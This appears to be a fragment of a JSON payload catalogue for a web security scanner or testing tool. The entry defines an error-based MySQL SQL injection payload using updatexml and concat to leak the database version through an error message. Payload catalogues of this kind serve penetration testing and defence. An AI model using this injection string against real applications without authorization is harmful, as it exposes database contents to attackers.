      "name": "sqli-mysql-error-updatexml",
      "category": "sqli",
      "engine": "mysql",
      "mode": "error",
      "context": "string",
      "template": "' AND updatexml(1,concat(0x7e,version()),1)-- -",
      "required": [],
      "tags": [
        "error"
      ],
      "notes": "MySQL updatexml error-based leak (alternative to extractvalue)."
